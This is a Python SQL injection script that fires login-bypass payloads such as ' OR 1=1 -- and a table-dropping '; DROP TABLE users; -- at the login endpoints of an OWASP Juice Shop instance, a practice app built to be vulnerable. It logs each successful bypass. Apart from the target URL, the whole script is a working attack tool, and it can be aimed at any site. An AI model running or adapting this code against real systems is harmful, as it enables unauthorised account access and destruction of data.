import requests
import time
from datetime import datetime

url = 'https://juice-shop.herokuapp.com'
possible_payloads = ["' OR 1=1 --", "' OR '1'='1 --", "'; DROP TABLE users; --"]
endpoints = ['rest/user/login', 'rest/user/authentication-details']
valid_tries = []

def log_to_file(message):
    with open("sqli_log.txt", "a") as logfile:
        logfile.write(f"{datetime.now()} - {message}\n")

def build_proxies():
    return {"http": "http://localhost:8080", "https": "http://localhost:8080"}

def create_payload_var_lengths(base_payload, var_lengths):
    return [base_payload + " OR " + v*"\'a\'" for v in var_lengths]

def test_payload_on_endpoint(ep, payload):
    full_url = f"{url}/{ep}"
    with requests.Session() as session:
        session.proxies.update(build_proxies())
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Content-Type': 'application/json'
        }
        data = {"email": payload, "password": "passwd"}
        try:
            log_to_file(f"Trying payload ({payload}) on {full_url}")
            start_time = time.time()
            response = session.post(full_url, json=data, headers=headers)
            server_response_time = time.time() - start_time
            print(f"Trying payload ({payload}) on {full_url} -> Status Code: {response.status_code}, Server Response Time: {server_response_time}s")
            if response.status_code == 200 and 'authentication' in response.json():
                log_to_file(f"[+] SQL Injection successful on endpoint {full_url} with payload: {payload}")
                print(f"[+] SQL Injection successful on endpoint {full_url} with payload: {payload}")
                valid_tries.append({"url": full_url, "request_fields": {"email": payload, "password": "passwd"}})
                return True
        except (requests.exceptions.RequestException, ValueError) as e:
            log_to_file(f"[-] Request failed for endpoint {full_url} with payload: {payload} due to {str(e)}")
            print(f"[-] Request failed for endpoint {full_url} with payload: {payload}")
            return False
    return False

for ep in endpoints:
    for payload in possible_payloads:
        if test_payload_on_endpoint(ep, payload):
            break

if valid_tries:
    print("SQL Injection attempts:")
    for attempt in valid_tries:
        print(attempt)
else:
    print("[-] SQL Injection unsuccessful")
